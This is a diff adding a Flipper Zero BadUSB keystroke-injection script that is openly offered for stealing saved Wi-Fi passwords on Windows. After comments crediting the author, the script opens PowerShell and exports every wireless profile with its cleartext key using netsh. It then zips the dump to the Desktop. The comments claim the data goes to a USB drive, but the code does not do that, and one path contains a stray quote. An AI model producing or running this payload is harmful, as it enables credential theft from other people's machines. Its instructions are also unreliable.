@@ -1,0 +1,37 @@
+REM Author: g0dm0de1337 Unl0ck-m0de 
+
+REM Description: "ORGINAL" (without edits)Steals all of the saved Wifi Passwords and stores them into a USB device of your choice. 
+
+REM Description2: use the "wizard USB Multitool" and format the usb-stick.. 
+
+REM Description2.1: give your USB-stick the letter "Q" and make the new folders: /WiFiHack/passwort/
+
+REM work: put your new "Q" USB-stick in your windows.. put your FlipperZer0 too in your windows and start the BadUSB script
+
+REM Version: 1.0 
+
+REM Category: Passwords 
+
+DELAY 1000 
+
+WINDOWS r 
+
+DELAY 900 
+
+STRING powershell  
+
+ENTER 
+
+DELAY 7000 
+
+STRING $folderDateTime = (get-date).ToString('d-M-y HHmmss');$userDir = (Get-ChildItem env:\userprofile).value + '\Wifi WPA2 SSIDs ' + $folderDateTime;$fileSaveDir = New-Item  ($userDir) -ItemType Directory;$date = get-date;netsh wlan export profile key=clear folder=$fileSaveDir;Compress-Archive -Path $fileSaveDir -DestinationPath C:\\Users\\$env:UserName\\Desktop\\" $((Get-Date).ToString('dd.MM.yyyy-HH-mm-ss')).zip   
+
+DELAY 2000 
+
+ENTER 
+
+DELAY 5500 
+
+STRING exit 
+
+ENTER
